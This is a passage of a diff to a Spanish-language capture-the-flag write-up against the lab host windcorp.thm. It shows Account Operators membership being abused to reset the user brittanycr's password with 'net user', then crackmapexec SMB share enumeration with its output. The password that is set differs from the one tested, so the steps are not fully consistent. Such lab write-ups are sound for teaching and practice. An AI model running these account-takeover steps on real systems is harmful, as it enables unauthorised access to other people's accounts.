@@ -847,6 +847,47 @@ Explicacion del exploit ---> https://github.com/theart42/cves/blob/master/cve-20
 
   -Necesitamos tener acceso al fichero ---> C:\Users\brittanycr\hosts.txt
 
+  Revisando toda la info del usuario con el que estamos logueados (buse) vemos que pertenecemos al grupo --> BUILTIN\Account Operators
+
+  ![image](https://github.com/Esevka/CTF/assets/139042999/054d5b4f-0b4e-487e-884c-9a0bdf554423)
+
+  INFO: 
+  
+    El grupo "BUILTIN\Account Operators" tiene como objetivo permitir a los usuarios administrar cuentas de usuario locales en el equipo.
+    Esto incluye la capacidad de crear, modificar y eliminar cuentas de usuario locales
+
+  - Vamos a intentar cambiar la clave del usuario --> brittanycr , e intentar loguearnos en el sistema con evil-winrm
+
+        *Evil-WinRM* PS C:\scripts> net user brittanycr NuevaContrasena#1234
+        The command completed successfully.
+
+    Intentamos hacer login mediante evil-winrm pero no fue exitoso, por lo que necesitamos otro punto de entrada.
+
+  - Lo Intentamos con SMB
+
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
+        └─# crackmapexec smb windcorp.thm -u brittanycr -p NewPass+1234 --shares
+        SMB         windcorp.thm    445    FIRE             [*] Windows 10.0 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
+        SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\brittanycr:NewPass+1234 
+        SMB         windcorp.thm    445    FIRE             [+] Enumerated shares
+        SMB         windcorp.thm    445    FIRE             Share           Permissions     Remark
+        SMB         windcorp.thm    445    FIRE             -----           -----------     ------
+        SMB         windcorp.thm    445    FIRE             ADMIN$                          Remote Admin
+        SMB         windcorp.thm    445    FIRE             C$                              Default share
+        SMB         windcorp.thm    445    FIRE             IPC$            READ            Remote IPC
+        SMB         windcorp.thm    445    FIRE             NETLOGON        READ            Logon server share 
+        SMB         windcorp.thm    445    FIRE             Shared          READ            
+        SMB         windcorp.thm    445    FIRE             SYSVOL          READ            Logon server share 
+        SMB         windcorp.thm    445    FIRE             Users           READ     
+
+      
+
+
+
+
+    
+
+    
   
      
     
